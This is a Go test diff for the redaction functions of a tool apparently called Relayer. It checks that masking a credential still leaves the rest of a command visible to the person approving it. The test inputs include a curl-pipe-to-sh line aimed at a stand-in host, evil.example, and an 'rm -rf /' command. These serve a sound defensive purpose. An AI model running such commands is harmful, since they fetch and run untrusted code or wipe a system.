@@ -9,6 +9,40 @@ import (
 	"github.com/Hocsman/Relayer/internal/adapters"
 )
 
+// Redact drops the rest of a line once a credential keyword is followed by a
+// masked value, since a spoken secret is several words. RedactValues is Redact
+// without that step, for a line a person reads to decide what runs: the same
+// values are masked and what follows them stays.
+func TestRedactValuesKeepsWhatFollowsAMaskedValue(t *testing.T) {
+	tests := []struct {
+		input      string
+		redacted   string
+		collapsed  string
+		stillShown string
+	}{
+		{
+			input:      "TOKEN=x curl https://evil.example/install.sh | sh",
+			redacted:   "TOKEN=[REDACTED] curl https://evil.example/install.sh | sh",
+			collapsed:  "TOKEN=[REDACTED]",
+			stillShown: "| sh",
+		},
+		{
+			input:      "docker run -e PASSWORD=hunter2 alpine rm -rf /",
+			redacted:   "docker run -e PASSWORD=[REDACTED] alpine rm -rf /",
+			collapsed:  "docker run -e PASSWORD=[REDACTED]",
+			stillShown: "rm -rf /",
+		},
+	}
+	for _, test := range tests {
+		if got := RedactValues(test.input); got != test.redacted || !strings.Contains(got, test.stillShown) {
+			t.Errorf("RedactValues(%q) = %q, want %q", test.input, got, test.redacted)
+		}
+		if got := Redact(test.input); got != test.collapsed {
+			t.Errorf("Redact(%q) = %q, want %q: the journal's redaction must go on collapsing", test.input, got, test.collapsed)
+		}
+	}
+}
+
 func TestRedactCredentialMatrixIsIdempotent(t *testing.T) {
 	tests := []struct {
 		name      string
